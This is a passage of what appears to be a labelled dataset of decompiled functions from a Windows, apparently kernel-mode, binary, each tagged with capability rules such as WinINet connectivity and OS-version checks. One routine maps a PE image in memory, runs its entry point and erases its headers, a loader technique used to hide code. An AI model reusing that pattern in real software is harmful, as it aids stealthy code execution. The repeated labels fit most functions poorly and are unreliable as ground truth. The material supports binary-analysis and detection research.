        "decompiled_code": "\nuint __cdecl fcn.0001cec0(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_20h;\n    uint var_18h;\n    int16_t *var_14h;\n    uint var_10h;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    if (*0x800ce3bc == 0) {\n        fcn.0002c090(0x800ccdf8, 0x52);\n        var_4h = 0x800ccdf8;\n        piVar1 = var_4h;\n        do {\n            var_4h = piVar1;\n            piVar1 = var_4h + 1;\n        } while (*var_4h != 0);\n        *0x800ce3bc = var_4h + 0x3ff99904 >> 1;\n        fcn.000789c6(0x800ccd48, 0x52, 0x80051754, 0x800ccdf8);\n        var_14h = 0x800ccd48;\n        piVar1 = var_14h;\n        do {\n            var_14h = piVar1;\n            piVar1 = var_14h + 1;\n        } while (*var_14h != 0);\n        *0x800ccdf4 = var_14h + 0x3ff9995c >> 1;\n    }\n    iVar2 = fcn.00078a32(arg_8h, 0x800ccdf8, *0x800ce3bc);\n    if (iVar2 == 0) {\n        uVar3 = 1;\n    }\n    else {\n        iVar2 = fcn.000364d0(arg_8h, 0x800ccd48, *0x800ccdf4);\n        if (iVar2 == 0) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 463
    },
    "0001cfb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0001cfb0(uint arg_8h, int16_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint uVar10;\n    uint *puVar11;\n    uint var_5ch;\n    uint var_54h;\n    int16_t *var_50h;\n    uint var_4ch;\n    uint var_44h;\n    int16_t *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_2dh;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_2dh._0_1_ = 0;\n    fcn.00037400(0x800ce3b8);\n    iVar3 = fcn.000533b0(0x800ce3b4, 0, 0);\n    if (iVar3 == 0) {\n        uVar4 = fcn.00037420(0x800ce3b8);\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else if (arg_10h < arg_14h) {\n        var_10h = fcn.000356c0(0x402);\n        if (var_10h != 0) {\n            var_8h = 0;\n            while( true ) {\n                puVar11 = &var_4h;\n                uVar10 = 0x400;\n                uVar8 = 0;\n                uVar6 = *0x800ce3a8;\n                uVar7 = arg_8h;\n                iVar3 = var_8h;\n                iVar9 = var_10h;\n                pcVar5 = fcn.00063f30(*0x800ce3a8);\n                *NULL = (*pcVar5)(uVar6, uVar7, iVar3, uVar8, iVar9, uVar10, puVar11);\n                if (*NULL == -0x7fffffe6) break;\n                if ((*NULL != 0) && (*NULL != -0x7ffffffb)) goto code_r0x0001d1e6;\n                if (*NULL == 0) {\n                    *(var_10h + 0x10 + (*(var_10h + 0xc) & 0xfffffffe)) = 0;\n                }\n                else {\n                    *(var_10h + 0x400) = 0;\n                }\n                if (arg_10h + 1 <= arg_14h) {\n                    var_40h = arg_ch;\n                    do {\n                        iVar1 = *var_40h;\n                        var_40h = var_40h + 1;\n                    } while (iVar1 != 0);\n                    var_50h = var_10h + 0x10;\n                    do {\n                        iVar1 = *var_50h;\n                        var_50h = var_50h + 1;\n                    } while (iVar1 != 0);\n                    var_ch = fcn.000356c0(((var_40h - (arg_ch + 1) >> 1) + 1 + (var_50h - (var_10h + 0x12) >> 1)) * 2 +\n                                          2);\n                    if (var_ch != 0) {\n                        fcn.00078a20(var_ch, 0x80051768, arg_ch, var_10h + 0x10);\n                        fcn.000789c0(&var_38h, var_ch);\n                        var_28h = 0x18;\n                        var_24h = 0;\n                        var_1ch = 0x140;\n                        var_20h = &var_38h;\n                        var_18h = 0;\n                        var_14h = 0;\n                        *NULL = fcn.000789ba(&var_3ch, 0xf003f, &var_28h);\n                        if (*NULL == 0) {\n                            cVar2 = fcn.0001cfb0(var_3ch, var_ch, arg_10h + 1, arg_14h);\n                            if (cVar2 != '\\0') {\n                                var_8h = var_8h + -1;\n                            }\n                            fcn.000789b4(var_3ch);\n                        }\n                        fcn.000357f0(var_ch);\n                    }\n                }\n                var_8h = var_8h + 1;\n            }\n            stack0xffffffd0 = 0;\ncode_r0x0001d1e6:\n            fcn.000357f0(var_10h);\n        }\n        *NULL = fcn.000789ea(arg_8h);\n        if (*NULL == 0) {\n            var_2dh._0_1_ = 1;\n        }\n        uVar4 = fcn.00037420(0x800ce3b8);\n        uVar4 = uVar4 & 0xffffff00 | var_2dh;\n    }\n    else {\n        uVar4 = fcn.00037420(0x800ce3b8);\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    return uVar4;\n}\n",
        "token_count": 1276
    },
    "0001d220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0001d220(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar1 = fcn.000533b0(0x800ce3c0, 1, 0);\n    if (iVar1 == 1) {\n        var_8h = 0;\n    }\n    else {\n        iVar1 = fcn.000161f0(0x80051774, 0x800cce9c);\n        if ((iVar1 == 0) || (var_8h = fcn.000161f0(0x80051790, 0x800cce9c),  var_8h == 0)) {\n            *0x800ce3c4 = *(*0x800cce9c + 8);\n            uVar3 = 0;\n            uVar2 = 0x800517aa;\n            var_8h = fcn.000759d0(0x800517aa);\n            if ((var_8h == 0) && (var_8h = fcn.0001e9d0(uVar2, uVar3),  var_8h == 0)) {\n                if (arg_8h == '\\0') {\n                    fcn.00078a98(0x8005d360, 0);\n                }\n                else {\n                    fcn.00015a50(0);\n                }\n            }\n            if (var_8h != 0) {\n                fcn.0001ee10();\n                fcn.00075bc0();\n                (**0x800512e0)();\n            }\n        }\n        else {\n            fcn.00071080(0x800ce3c0, 0);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 430
    },
    "0001d300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0001d300(void)\n\n{\n    if (*0x800ce3c0 != 0) {\n        fcn.00078a98(0x8005d360, 1);\n        fcn.0001ee10();\n        fcn.00075bc0();\n        (**0x800512e0)();\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0001d3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001d3f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x800ce3c8 == 0) {\n        (**0x80051120)(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        iVar2 = *0x800ce3c8;\n        pcVar1 = fcn.00063f30(*0x800ce3c8);\n        (*pcVar1)(iVar2, arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "0001d430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001d430(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x800ce3cc == 0) {\n        (**0x800510b4)(arg_8h, arg_ch);\n    }\n    else {\n        iVar2 = *0x800ce3cc;\n        pcVar1 = fcn.00063f30(*0x800ce3cc);\n        (*pcVar1)(iVar2, arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0001d470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0001d470(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint var_5h;\n    \n    if (*0x800ce3d0 == 0) {\n        uVar2 = fcn.00078a9e(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        iVar4 = *0x800ce3d0;\n        pcVar3 = fcn.00063f30(*0x800ce3d0);\n        uVar2 = (*pcVar3)(iVar4, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        fcn.0001baf0(uVar2 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "0001d4f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001d4f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint32_t extraout_ECX;\n    int32_t iVar4;\n    uint var_5h;\n    \n    if (*0x800ce3d4 == 0) {\n        uVar2 = fcn.000789ae(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        iVar4 = *0x800ce3d4;\n        pcVar3 = fcn.00063f30(*0x800ce3d4);\n        uVar2 = (*pcVar3)(iVar4, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n        fcn.0001baf0(extraout_ECX & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 275
    },
    "0001d570": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0001d570(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint var_5h;\n    \n    if (*0x800ce3d8 == 0) {\n        uVar2 = fcn.00078a74(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        iVar4 = *0x800ce3d8;\n        pcVar3 = fcn.00063f30(*0x800ce3d8);\n        uVar2 = (*pcVar3)(iVar4, arg_8h, arg_ch, arg_10h, arg_14h);\n        fcn.0001baf0(uVar2 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 236
    },
    "0001d5e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001d5e0(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    code *pcVar3;\n    ulong uVar4;\n    int32_t iVar5;\n    uint var_5h;\n    \n    if (*0x800ce3dc == 0) {\n        uVar2 = fcn.00078aa4(arg_8h, arg_ch);\n    }\n    else {\n        uVar1 = fcn.0001baf0(0);\n        iVar5 = *0x800ce3dc;\n        pcVar3 = fcn.00063f30(*0x800ce3dc);\n        uVar4 = (*pcVar3)(iVar5, arg_8h, arg_ch);\n        uVar2 = uVar4;\n        fcn.0001baf0(uVar4 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 219
    },
    "0001d640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __fastcall fcn.0001d640(uint param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00061b60(param_1);\n    if (iVar1 == 0) {\n        fcn.00061bc0(0x800517bc, 0x800ce3c8);\n        fcn.00061bc0(0x800517d4, 0x800ce3cc);\n        fcn.00061c00(0x800516e8, 0x800ce3d0);\n        fcn.00061c00(0x800517e8, 0x800ce3d4);\n        fcn.00061c00(0x800517f8, 0x800ce3d8);\n        fcn.00061c00(0x80051808, 0x800ce3dc);\n        fcn.00061ba0();\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 245
    },
    "0001d850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0001d850(void)\n\n{\n    int32_t iVar1;\n    uint var_240h;\n    int32_t var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint *var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_210h;\n    uint var_4h;\n    \n    var_220h._0_2_ = 0x70;\n    var_220h._2_2_ = 0x72;\n    var_21ch = 0x80051830;\n    var_238h = 0x18;\n    var_234h = 0;\n    var_22ch = 0x40;\n    var_230h = &var_220h;\n    var_228h = 0;\n    var_224h = 0;\n    iVar1 = fcn.00078aaa(&var_240h, 0x1f0003, &var_238h);\n    if (iVar1 == 0) {\n        fcn.000789b4(var_240h);\n        var_23ch = 0x40000000;\n    }\n    else {\n        fcn.0002be80(&var_210h, 0x104);\n        fcn.000789c0(&var_218h, &var_210h);\n        var_238h = 0x18;\n        var_234h = 0;\n        var_22ch = 0x40;\n        var_230h = &var_218h;\n        var_228h = 0;\n        var_224h = 0;\n        iVar1 = fcn.00078aaa(&var_240h, 0x1f0003, &var_238h);\n        if (iVar1 == 0) {\n            fcn.000789b4(var_240h);\n            var_23ch = 0x40000000;\n        }\n        else {\n            var_23ch = fcn.00037260(&var_4h);\n            if (var_23ch == 0) {\n                var_238h = 0x18;\n                var_234h = 0;\n                var_22ch = 0x240;\n                var_230h = &var_218h;\n                var_228h = var_4h;\n                var_224h = 0;\n                var_23ch = fcn.00078ab0(*0x800cc770 + 0x1c, 0x1f0003, &var_238h, 0, 0);\n                fcn.000373e0(var_4h);\n            }\n        }\n    }\n    return var_23ch;\n}\n",
        "token_count": 640
    },
    "0001da10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001da10(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*arg_8h == -1) {\n        var_10h = 0;\n    }\n    else {\n        arg_8h_00 = fcn.000356f0(*(*0x800cc770 + 8));\n        if (arg_8h_00 == 0) {\n            var_10h = -0x3fffff66;\n        }\n        else {\n            fcn.00078be8(arg_8h_00, *0x800ce3e0, *(*0x800cc770 + 8));\n            iVar2 = *0x800ce3e0 + *(*0x800ce3e0 + 0x3c);\n            var_10h = fcn.0005b790(arg_8h_00, (arg_8h_00 - *0x800ce3e0) + *(iVar2 + 0x34));\n            if (var_10h == 0) {\n                pcVar1 = arg_8h_00 + *(iVar2 + 0x28);\n                if (pcVar1 == NULL) {\n                    var_10h = -0x3fffffff;\n                }\n                else {\n                    arg_8h[3] = arg_8h_00;\n                    var_10h = (*pcVar1)(arg_8h, arg_ch);\n                    if (var_10h == 0) {\n                        for (var_14h = 0; var_14h < *(arg_8h_00 + 0x54 + *(arg_8h_00 + 0x3c)) >> 2;\n                            var_14h = var_14h + 1) {\n                            *(arg_8h_00 + var_14h * 4) = 0;\n                        }\n                        var_10h = -0x3ffffee0;\n                    }\n                }\n            }\n        }\n        if (var_10h != -0x3ffffee0) {\n            fcn.000357f0(arg_8h_00);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 542
    },
    "0001db30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0001db30(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x800b94b7 == '\\0') {\n        iVar1 = 0;\n    }\n    else {\n        *0x800b94b7 = '\\0';\n        iVar1 = fcn.0001d840();\n        if ((iVar1 == 0) && ((arg_10h == 0 || (iVar1 = fcn.0001d850(),  iVar1 == 0)))) {\n            iVar1 = fcn.00036e40(*0x800cc770 + 0x14);\n            if (iVar1 == 0) {\n                iVar1 = -1;\n            }\n            else {\n                iVar1 = fcn.0001da10(arg_8h, arg_ch);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 214
    },
    "0001dbb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0001dbb0(void)\n\n{\n    char cVar1;\n    uint var_78h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0x800518a4;\n    var_4h = 0;\n    fcn.0002c120(&var_68h, 0x52);\n    var_6ch = &var_68h;\n    do {\n        cVar1 = *var_6ch;\n        var_6ch = var_6ch + 1;\n    } while (cVar1 != '\\0');\n    var_ch = fcn.00077170(0x800ce5f0, &var_8h, &var_68h, var_6ch + (1 - (&var_68h + 1)), 1);\n    if (var_ch == 0) {\n        var_ch = fcn.000778a0(*0x800ce5f0, 0x8005dc60, 0, 0);\n    }\n    return var_ch;\n}\n",
        "token_count": 268
    },
    "0001dc60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0001dc60(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        var_ch = NULL;\n    }\n    else {\n        var_ch = fcn.0002f6b0(arg_10h, arg_14h);\n        if (var_ch == NULL) {\n            return 0xffffffff;\n        }\n    }\n    var_10h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_14h = fcn.0002b3f0(arg_8h, arg_ch, var_ch, &var_10h, &var_4h, &var_8h, 0);\n    iVar2 = fcn.00078000(arg_8h, &var_10h, 4, 0);\n    if (iVar2 == 0) {\n        if (0 < var_8h) {\n            iVar2 = fcn.00077f80(arg_8h, var_8h, 0);\n            *arg_18h = iVar2;\n            if (*arg_18h == 0) {\n                var_14h = 0x21590004;\n            }\n            else {\n                fcn.00078be8(*arg_18h, var_4h, var_8h);\n                *arg_1ch = var_8h;\n            }\n        }\n    }\n    else {\n        var_14h = 0xffffffff;\n        fcn.00077fa0(arg_8h, *arg_18h, 0);\n        *arg_18h = 0;\n        *arg_1ch = 0;\n    }\n    fcn.000357f0(var_4h);\n    while (var_ch != NULL) {\n        puVar1 = *var_ch;\n        if (var_ch[4] != var_ch + 5) {\n            fcn.000357f0(var_ch[4]);\n        }\n        fcn.000357f0(var_ch);\n        var_ch = puVar1;\n    }\n    return var_14h;\n}\n",
        "token_count": 553
    },
    "0001de90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0001de90(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_65h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    iVar1 = fcn.00020a10(arg_10h, 0x17, 4, &var_74h, 0);\n    if (iVar1 == 0) {\n        var_6ch = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00020a80(arg_10h, 0x19, 1, &var_65h, 1);\n        if (iVar1 == 0) {\n            var_65h._0_1_ = 0;\n        }\n        iVar1 = fcn.00020a10(arg_10h, 0x18, 4, &var_28h, 0);\n        if (iVar1 == 0) {\n            var_28h = 0;\n        }\n        iVar1 = fcn.00020a80(arg_10h, 0x23, 8, &var_70h, 4);\n        if (iVar1 == 0) {\n            var_70h = 0;\n        }\n        iVar1 = fcn.00020a80(arg_10h, 0x24, 2, &var_65h + 1, 4);\n        if (iVar1 == 0) {\n            stack0xffffff98 = 0;\n        }\n        var_10h = 0;\n        var_ch = NULL;\n        var_8h = 0;\n        var_4h = 0;\n        var_6ch = fcn.00018f10(var_74h, var_28h, &stack0xffffff00 | var_65h, -(var_70h != 0) & &var_70h, &var_14h);\n        if (var_6ch == 0) {\n            iVar1 = fcn.000180d0(var_14h, -(var_70h != 0) & &var_70h);\n            var_20h = iVar1 + 1;\n            var_10h = 7;\n            var_ch = &var_60h;\n            fcn.00078bfa(&var_60h);\n            var_60h = 0x1f;\n            var_5ch = 4;\n            var_58h = 0x32;\n            var_54h = 4;\n            var_50h = 0x1b;\n            var_4ch = 2;\n            var_48h = 0x33;\n            var_44h = 8;\n            var_40h = 0x34;\n            var_3ch = 8;\n            var_38h = 0x35;\n            var_34h = 8;\n            var_30h = 0x36;\n            var_2ch = 8;\n            var_4h = fcn.000357b0(var_20h, 4);\n            if (var_4h == 0) {\n                var_6ch = 0x21590004;\n            }\n            else {\n                fcn.00078bfa(var_4h);\n                var_18h = 0;\n                fcn.00018500(var_14h, var_4h, -(var_70h != 0) & &var_70h, stack0xffffff98, \n                             -(stack0xffffff98 != 0) & &var_18h);\n                for (var_1ch = 0; (*(var_4h + var_1ch * 4) != 0 && (var_1ch < var_20h)); var_1ch = var_1ch + 1) {\n                }\n                var_8h = var_1ch;\n                var_6ch = fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n            }\n        }\n        if (var_14h != 0) {\n            for (var_24h = 0; *(var_14h + var_24h * 4) != 0; var_24h = var_24h + 1) {\n                fcn.00019230(*(var_14h + var_24h * 4));\n            }\n            fcn.000357f0(var_14h);\n        }\n        if (var_4h != 0) {\n            for (var_24h = 0; var_24h < var_8h; var_24h = var_24h + 1) {\n                if (*(var_4h + var_24h * 4) != 0) {\n                    fcn.000357f0(*(var_4h + var_24h * 4));\n                }\n            }\n            fcn.000357f0(var_4h);\n        }\n    }\n    return var_6ch;\n}\n",
        "token_count": 1340
    },
    "0001e1c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0001e1c0(void)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_44h;\n    char *var_40h;\n    char *var_3ch;\n    uint var_38h;\n    uint var_30h;\n    char *var_2ch;\n    char *var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0x800518a8;\n    var_14h = 0x800518b0;\n    var_10h = 0x800518b8;\n    var_ch = 0x800518c4;\n    *0x800ce610 = fcn.000298c0(6, 2);\n    for (var_8h = 0; var_8h < *0x800ce608; var_8h = var_8h + 1) {\n        fcn.000357f0(*(*0x800ce60c + var_8h * 4));\n    }\n    fcn.000357f0(*0x800ce60c);\n    *0x800ce60c = fcn.000356c0(0x10);\n    if (*0x800ce60c != 0) {\n        for (var_8h = 0; var_8h < 4; var_8h = var_8h + 1) {\n            var_2ch = (&var_18h)[var_8h];\n            pcVar3 = var_2ch + 1;\n            do {\n                cVar1 = *var_2ch;\n                var_2ch = var_2ch + 1;\n            } while (cVar1 != '\\0');\n            uVar4 = fcn.000356c0(var_2ch + (1 - pcVar3));\n            *(*0x800ce60c + var_8h * 4) = uVar4;\n            if (*(*0x800ce60c + var_8h * 4) == 0) {\n                *0x800ce608 = var_8h;\n                return;\n            }\n            var_3ch = (&var_18h)[var_8h];\n            var_40h = *(*0x800ce60c + var_8h * 4);\n            do {\n                cVar1 = *var_3ch;\n                *var_40h = cVar1;\n                var_3ch = var_3ch + 1;\n                var_40h = var_40h + 1;\n            } while (cVar1 != '\\0');\n        }\n        *0x800ce608 = var_8h;\n        iVar5 = fcn.000294e0(7, 0, 0, &var_20h);\n        if (((iVar5 == 0) && (var_20h != NULL)) && (pcVar3 = fcn.000356c0(var_20h),  pcVar3 != NULL)) {\n            iVar5 = fcn.000294e0(7, pcVar3, var_20h, &var_20h);\n            if (iVar5 == 0) {\n                var_4h = 0;\n                var_1ch = pcVar3;\n                for (var_28h = pcVar3; *var_28h != '\\0'; var_28h = var_28h + 1) {\n                    if ((*var_28h == ';') && (1 < var_28h - var_1ch)) {\n                        var_1ch = var_28h + 1;\n                        var_4h = var_4h + 1;\n                    }\n                }\n                iVar5 = fcn.00057d40(0x800ce60c, 8, var_4h * 4 + 8);\n                var_28h = pcVar3;\n                pcVar2 = pcVar3;\n                if (iVar5 == -1) {\n                    fcn.000357f0(pcVar3);\n                }\n                else {\n                    for (; var_1ch = pcVar2,  *var_28h != '\\0'; var_28h = var_28h + 1) {\n                        if ((*var_28h == ';') && (1 < var_28h - var_1ch)) {\n                            *var_28h = '\\0';\n                            var_20h = var_28h + (1 - var_1ch);\n                            uVar4 = fcn.000356c0(var_20h);\n                            *(*0x800ce60c + *0x800ce608 * 4) = uVar4;\n                            if (*(*0x800ce60c + *0x800ce608 * 4) != 0) {\n                                fcn.00078be8(*(*0x800ce60c + *0x800ce608 * 4), var_1ch, var_20h);\n                                fcn.00078ab6(*(*0x800ce60c + *0x800ce608 * 4));\n                                *0x800ce608 = *0x800ce608 + 1;\n                            }\n                            var_1ch = var_28h + 1;\n                        }\n                        pcVar2 = var_1ch;\n                    }\n                    fcn.000357f0(pcVar3);\n                }\n            }\n            else {\n                fcn.000357f0(pcVar3);\n            }\n        }\n    }\n    